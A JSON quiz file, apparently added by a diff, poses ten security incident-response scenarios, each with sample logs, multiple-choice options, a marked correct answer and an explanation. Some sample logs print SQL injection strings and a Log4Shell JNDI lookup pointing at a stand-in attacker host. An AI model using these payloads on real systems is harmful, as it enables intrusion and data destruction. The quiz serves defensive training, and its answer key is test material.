@@ -1,0 +1,204 @@
+{
+  "id": "security-incident-response-quiz",
+  "title": "Security Incident Response Quiz",
+  "description": "Test your ability to detect, respond to, and mitigate security incidents including breaches, attacks, and vulnerabilities",
+  "category": "Security",
+  "icon": "Shield",
+  "totalPoints": 140,
+  "theme": {
+    "primaryColor": "red",
+    "gradientFrom": "from-red-600",
+    "gradientTo": "to-orange-700"
+  },
+  "metadata": {
+    "estimatedTime": "20-25 minutes",
+    "difficultyLevels": {
+      "beginner": 3,
+      "intermediate": 4,
+      "advanced": 3
+    },
+    "createdDate": "2024-12-09"
+  },
+  "questions": [
+    {
+      "id": "suspicious-login-activity",
+      "title": "Suspicious Login Activity Detected",
+      "description": "Your monitoring system flags unusual authentication patterns from admin accounts.",
+      "situation": "At 3 AM, you receive alerts about 50+ failed login attempts on admin accounts, followed by 3 successful logins from IP addresses in different countries. The successful logins are accessing sensitive customer data.",
+      "codeExample": "Security Logs:\n[03:15] FAILED_LOGIN admin@company.com from 185.220.101.45 (Russia)\n[03:16] FAILED_LOGIN admin@company.com from 185.220.101.45 (Russia)\n... 48 more failed attempts ...\n[03:22] SUCCESS_LOGIN admin@company.com from 185.220.101.45 (Russia)\n[03:23] DATA_ACCESS customer_database by admin@company.com\n[03:24] DATA_EXPORT 10,000 records by admin@company.com\n[03:25] SUCCESS_LOGIN admin2@company.com from 203.0.113.27 (China)\n\nCurrent Status:\n- Admin accounts: 3 active sessions from unusual locations\n- Data accessed: Customer PII database\n- Time since first alert: 15 minutes",
+      "options": [
+        "Wait until morning to investigate during business hours",
+        "Immediately disable compromised accounts, force password resets, start incident response",
+        "Block the IP addresses and continue monitoring",
+        "Send an email to the admin users asking if it was them"
+      ],
+      "correctAnswer": 1,
+      "explanation": "This is an active security breach. Immediate action is critical: 1) Disable compromised accounts to stop ongoing data access, 2) Preserve forensic evidence, 3) Activate incident response team, 4) Assess scope of breach, 5) Notify stakeholders. Waiting or just blocking IPs allows continued unauthorized access. Every minute counts when data is being exfiltrated.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "intermediate"
+    },
+    {
+      "id": "ransomware-attack",
+      "title": "Ransomware Detected on Production Servers",
+      "description": "Multiple servers show signs of ransomware encryption with a ransom note demanding payment.",
+      "situation": "Your EDR system alerts that 5 production servers are executing suspicious encryption processes. File extensions are being changed to .locked and a README.txt appears demanding 10 Bitcoin payment within 48 hours.",
+      "codeExample": "Alert Details:\n[CRITICAL] Ransomware detected on prod-server-01 through prod-server-05\n[CRITICAL] Mass file encryption in progress\n[CRITICAL] Lateral movement detected\n\nRansom Note Content:\n'Your files have been encrypted. Pay 10 BTC to wallet:\n1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa within 48 hours\nor files will be permanently deleted. Decryption key\nwill be provided after payment.'\n\nCurrent Status:\n- Encrypted files: ~40% of production data\n- Spread rate: 2 servers/minute\n- Backups: Last backup 6 hours ago\n- Network: Still connected",
+      "options": [
+        "Pay the ransom immediately to recover the files quickly",
+        "Isolate affected systems, disconnect network, activate IR plan, assess backup integrity",
+        "Restart the servers and run antivirus scans",
+        "Negotiate with the attackers for a lower ransom amount"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Never pay ransoms - it funds criminals and doesn't guarantee recovery. Critical steps: 1) Immediately isolate infected systems to prevent spread, 2) Disconnect from network but preserve forensics, 3) Activate incident response team, 4) Verify backup integrity and test restoration, 5) Identify attack vector, 6) Report to law enforcement. Paying ransoms is discouraged by FBI/CISA and may be illegal in some jurisdictions.",
+      "points": 20,
+      "category": "Security Incident",
+      "difficulty": "advanced"
+    },
+    {
+      "id": "sql-injection-attempt",
+      "title": "Active SQL Injection Attack",
+      "description": "WAF is detecting coordinated SQL injection attempts targeting your database.",
+      "situation": "Your Web Application Firewall shows 1000+ SQL injection attempts in the last 10 minutes from multiple IPs. Some queries are bypassing validation and reaching your database.",
+      "codeExample": "WAF Logs:\n[HIGH] SQL Injection: ' OR '1'='1 from 192.0.2.15\n[HIGH] SQL Injection: '; DROP TABLE users-- from 192.0.2.88\n[HIGH] SQL Injection: ' UNION SELECT * FROM passwords-- from 198.51.100.42\n[CRITICAL] Bypass detected: Query executed on database\n\nApplication Logs:\n[ERROR] Database error: syntax error near 'OR'\n[WARN] Unusual query pattern detected\n[ERROR] Multiple table access from single request\n\nDatabase Activity:\n- Query volume: 10x normal\n- Failed queries: 95%\n- Successful malicious queries: ~50\n- Data exposure: Possible",
+      "options": [
+        "Block the attacking IP addresses in the firewall",
+        "Enable WAF strict mode, review query logs for data exposure, patch vulnerable code, rotate credentials",
+        "Disable the affected endpoint temporarily",
+        "Add rate limiting to slow down the attacks"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Multi-layered response needed: 1) Immediately enable WAF strict mode to block attacks, 2) Review logs to determine if data was exposed, 3) Identify and patch vulnerable input validation, 4) Rotate database credentials in case they were exposed, 5) Consider taking affected services offline if breach confirmed, 6) Implement prepared statements/parameterized queries. Just blocking IPs is ineffective against distributed attacks.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "intermediate"
+    },
+    {
+      "id": "insider-threat",
+      "title": "Suspected Insider Data Theft",
+      "description": "An employee with access privileges is downloading large amounts of sensitive data before their resignation.",
+      "situation": "HR notified you that a senior engineer submitted their resignation yesterday. Today, access logs show this user downloaded 50GB of proprietary code, customer databases, and internal documents to a personal device.",
+      "codeExample": "Access Audit Log:\n[09:30] user: john.doe - Downloaded: customer_database.sql (5GB)\n[09:45] user: john.doe - Downloaded: proprietary_algorithm.zip (2GB)\n[10:15] user: john.doe - Downloaded: financial_reports_2024.zip (500MB)\n[10:30] user: john.doe - Cloned: all-repositories (42GB)\n[10:45] user: john.doe - Accessed: competitor_analysis_internal.pdf\n\nUser Status:\n- Role: Senior Software Engineer\n- Access level: High (Admin on 5 systems)\n- Resignation date: Yesterday\n- Last day: 2 weeks from now\n- Known fact: Joining competitor next month",
+      "options": [
+        "Confront the employee directly and ask them to return the data",
+        "Immediately revoke access, preserve evidence, engage legal team, notify management",
+        "Wait until their last day and then revoke access",
+        "Monitor their activity closely for the next 2 weeks"
+      ],
+      "correctAnswer": 1,
+      "explanation": "This is a clear insider threat with potential IP theft. Immediate action: 1) Revoke all system access immediately, 2) Preserve detailed audit logs and evidence, 3) Engage legal counsel and HR, 4) Consider security escort and early termination, 5) Send preservation letter demanding return of data, 6) Review what data was accessed for damage assessment. Delay risks further data exfiltration and competitive harm.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "intermediate"
+    },
+    {
+      "id": "ddos-attack",
+      "title": "Distributed Denial of Service Attack",
+      "description": "Your website is receiving massive traffic from thousands of IPs, making it unavailable to legitimate users.",
+      "situation": "At 10 AM during peak business hours, your website becomes unreachable. Traffic logs show 1 million requests per minute from 50,000+ unique IPs worldwide. Legitimate customer complaints are flooding in.",
+      "codeExample": "Traffic Analysis:\n- Incoming requests: 1,000,000/min (normal: 5,000/min)\n- Unique IPs: 50,000+ from 150 countries\n- Request pattern: Identical user agents, rapid fire\n- Target: Homepage and API endpoints\n- Server status: CPU 100%, Memory 98%, Network saturated\n\nSample Requests:\nGET / HTTP/1.1 from 203.0.113.* (repeated 1000x)\nPOST /api/search HTTP/1.1 (crafted to be resource intensive)\n\nBusiness Impact:\n- Website: Completely unavailable\n- Revenue loss: $50,000/hour\n- Customer complaints: 500+ in last 10 minutes",
+      "options": [
+        "Increase server capacity by adding more instances",
+        "Enable DDoS protection (CDN/Cloudflare), implement rate limiting, geo-blocking, work with ISP",
+        "Block all international traffic",
+        "Take the website offline until the attack stops"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Effective DDoS mitigation requires multiple layers: 1) Activate DDoS protection service (CDN/Cloudflare) to absorb attack traffic, 2) Implement rate limiting and connection limits, 3) Use geo-blocking if attack source is concentrated, 4) Work with ISP for upstream filtering, 5) Enable caching for static content, 6) Consider temporary captcha for verification. Simply scaling up is expensive and ineffective. Taking site offline lets attackers win.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "intermediate"
+    },
+    {
+      "id": "api-key-exposure",
+      "title": "API Keys Exposed in Public Repository",
+      "description": "A developer accidentally committed AWS credentials to a public GitHub repository.",
+      "situation": "GitHub's secret scanning alerted you that AWS access keys with admin privileges were pushed to a public repo 2 hours ago. CloudTrail shows unusual API activity from unknown IPs.",
+      "codeExample": "GitHub Alert:\n[CRITICAL] AWS credentials detected in commit abc123\nRepository: company/web-app (PUBLIC)\nFile: config/production.env\nExposed: AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n         AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nCommit time: 2 hours ago\nRepo views: 47 in last 2 hours\n\nCloudTrail Activity:\n[14:30] EC2.RunInstances from IP 185.220.101.55 (Unknown)\n[14:35] S3.ListBuckets from IP 185.220.101.55\n[14:40] IAM.CreateUser from IP 185.220.101.55\n[14:45] Lambda.CreateFunction (crypto-miner) from IP 185.220.101.55\n\nEstimated cost exposure: $15,000 and growing",
+      "options": [
+        "Delete the commit from Git history and hope no one saw it",
+        "Immediately revoke credentials, audit all API activity, rotate all keys, remove commit, scan for damage",
+        "Contact GitHub support to delete the repository",
+        "Change the repository to private"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Exposed credentials are compromised immediately by automated scanners. Critical steps: 1) IMMEDIATELY revoke exposed credentials to stop ongoing abuse, 2) Audit CloudTrail for all unauthorized activity, 3) Terminate unauthorized resources (EC2 instances, Lambda functions), 4) Rotate ALL credentials (assume lateral movement), 5) Remove sensitive data from Git history using BFG/git-filter-repo, 6) Enable AWS secret scanning, 7) Implement secrets management solution. Every second counts as crypto miners cost thousands per hour.",
+      "points": 20,
+      "category": "Security Incident",
+      "difficulty": "advanced"
+    },
+    {
+      "id": "phishing-campaign",
+      "title": "Targeted Phishing Campaign Against Employees",
+      "description": "Multiple employees received convincing phishing emails, and some have entered their credentials.",
+      "situation": "Your security team detects a sophisticated spear-phishing campaign. 50 employees received emails appearing to be from IT, asking them to verify their credentials. 8 employees clicked the link and entered credentials on a fake login page.",
+      "codeExample": "Email Analysis:\nFrom: it-support@cornpany.com (note typo)\nSubject: [URGENT] Verify your account to prevent suspension\nBody: 'Your account will be suspended in 24 hours unless\nyou verify your credentials at: https://company-login-verify.com'\n\nLink analysis:\n- Domain: company-login-verify.com (registered 2 days ago)\n- Certificate: Valid SSL (Let's Encrypt)\n- Page: Exact replica of company login\n\nCompromised accounts:\n- 8 employees entered credentials\n- 3 clicked but didn't enter credentials  \n- Accounts include: 2 developers, 1 HR manager, 5 sales reps\n- Time since compromise: 30 minutes",
+      "options": [
+        "Send a company-wide email warning about the phishing attempt",
+        "Force password reset for affected users, enable MFA, review access logs, run security training",
+        "Block the phishing domain in your email filter",
+        "Report the phishing domain to the registrar"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Rapid response to credential compromise: 1) Immediately force password reset for all 8 affected accounts, 2) Enable/enforce MFA on all accounts, 3) Review access logs for unauthorized activity using compromised credentials, 4) Check for lateral movement or data access, 5) Block phishing domain and add email filters, 6) Conduct security awareness training, 7) Monitor for follow-up attacks. Just warning others or blocking domain doesn't secure already-compromised accounts.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "intermediate"
+    },
+    {
+      "id": "zero-day-vulnerability",
+      "title": "Zero-Day Exploit in Production Software",
+      "description": "A critical zero-day vulnerability is announced for software you're running in production.",
+      "situation": "CISA just published an emergency directive about a critical RCE (Remote Code Execution) vulnerability in Apache Log4j. Your team confirms you're running affected versions in 20+ production services. Active exploitation is detected in the wild.",
+      "codeExample": "Vulnerability Details:\nCVE-2021-44228 (Log4Shell)\nSeverity: CRITICAL (CVSS 10.0)\nAffected: Apache Log4j 2.0-beta9 to 2.14.1\nExploit: ${jndi:ldap://attacker.com/a} in logs triggers RCE\nPublic exploit: Available\nActive scanning: Detected worldwide\n\nYour Environment:\n- 20 production services using Log4j 2.13.0\n- Public-facing: 8 services\n- Critical data access: 12 services\n- Patch availability: Yes (Log4j 2.15.0)\n- Deployment time: 2-4 hours per service\n\nThreat Intel:\n- Mass scanning started 4 hours ago\n- Ransomware gangs actively exploiting\n- Your IPs not yet scanned (luck)",
+      "options": [
+        "Wait for security team to test patches before deploying",
+        "Emergency patch deployment, enable WAF rules, isolate critical services, hunt for IoCs",
+        "Schedule maintenance window for next week to patch properly",
+        "Disable logging temporarily until patches are ready"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Critical zero-days require emergency response: 1) Immediately deploy patches to public-facing services (hours matter), 2) Enable WAF/IPS rules to block known exploit patterns, 3) Isolate critical services from internet if patching takes time, 4) Hunt for indicators of compromise (IoCs) in logs, 5) Monitor for exploitation attempts, 6) Set up detection rules. With CVSS 10.0 and active exploitation, waiting is not an option. Every hour of delay increases breach risk exponentially.",
+      "points": 20,
+      "category": "Security Incident",
+      "difficulty": "advanced"
+    },
+    {
+      "id": "data-breach-notification",
+      "title": "Customer Data Breach - Legal Obligations",
+      "description": "You've confirmed a breach exposing 100,000 customer email addresses and hashed passwords.",
+      "situation": "After investigation, you've confirmed attackers accessed customer database containing 100,000 email addresses, bcrypt hashed passwords, and names. Breach occurred 5 days ago. You're in the US and have EU customers.",
+      "codeExample": "Breach Assessment:\nData exposed:\n- Email addresses: 100,000\n- Names: 100,000\n- Hashed passwords: 100,000 (bcrypt, cost 12)\n- No SSN, credit cards, or financial data\n\nBreach timeline:\n- Initial compromise: 5 days ago\n- Detection: Today\n- Containment: Today\n\nRegulatory requirements:\n- GDPR (EU): 72-hour notification to DPA\n- California (CCPA): Notification without unreasonable delay\n- Other US states: Various timelines\n\nAffected users:\n- US users: 70,000\n- EU users: 25,000\n- Other: 5,000",
+      "options": [
+        "Wait until you have complete information before notifying anyone",
+        "Notify data protection authorities immediately, prepare customer notifications, engage legal counsel",
+        "Only notify EU customers since GDPR has strict requirements",
+        "Handle it internally and only notify if passwords are cracked"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Breach notification is legally mandated: 1) Immediately notify data protection authorities (GDPR 72-hour deadline already at risk), 2) Prepare customer notifications (required by GDPR, CCPA, and state laws), 3) Engage legal counsel for regulatory compliance, 4) Document breach details and response, 5) Offer credit monitoring if appropriate, 6) File required regulatory reports. Failure to notify can result in massive fines (GDPR: up to €20M or 4% revenue). Hashed passwords still constitute a breach requiring notification.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "advanced"
+    },
+    {
+      "id": "malware-infection",
+      "title": "Malware Detected on Corporate Endpoints",
+      "description": "EDR detected malware on 15 employee laptops with indicators of data exfiltration.",
+      "situation": "Your EDR system flags malware infections on 15 laptops across different departments. Network analysis shows these machines are uploading data to an external server. Malware appears to be keylogger with data theft capabilities.",
+      "codeExample": "EDR Alert:\n[CRITICAL] Malware detected: InfoStealer.Variant\nAffected systems: 15 endpoints\nBehavior observed:\n- Keylogger active\n- Screenshot capture\n- Browser credential theft\n- Data exfiltration to 203.0.113.99\n\nNetwork Traffic:\n- Destination: 203.0.113.99:443 (Russia)\n- Data uploaded: 2.5GB total\n- Connections: Persistent (every 5 minutes)\n- Encrypted: Yes (custom protocol)\n\nAffected Users:\n- Finance team: 5 users\n- Development team: 7 users\n- HR team: 3 users\n- Infection source: Unknown\n- Time infected: Estimated 3-5 days",
+      "options": [
+        "Run antivirus scans on all affected machines",
+        "Immediately isolate infected systems, force credential resets, analyze exfiltrated data, image systems for forensics",
+        "Have users restart their computers to clear the infection",
+        "Block the external IP address and monitor for further activity"
+      ],
+      "correctAnswer": 1,
+      "explanation": "Malware with data exfiltration requires aggressive response: 1) Immediately network-isolate infected systems (prevent further data theft), 2) Force password resets for all affected users (keylogger captured credentials), 3) Analyze what data was exfiltrated (2.5GB could be sensitive docs, code, credentials), 4) Take forensic images before remediation, 5) Identify infection vector to prevent reinfection, 6) Scan all systems for same IoCs, 7) Review access logs for compromised credentials. Antivirus scanning alone won't secure already-stolen credentials.",
+      "points": 15,
+      "category": "Security Incident",
+      "difficulty": "intermediate"
+    }
+  ]
+}
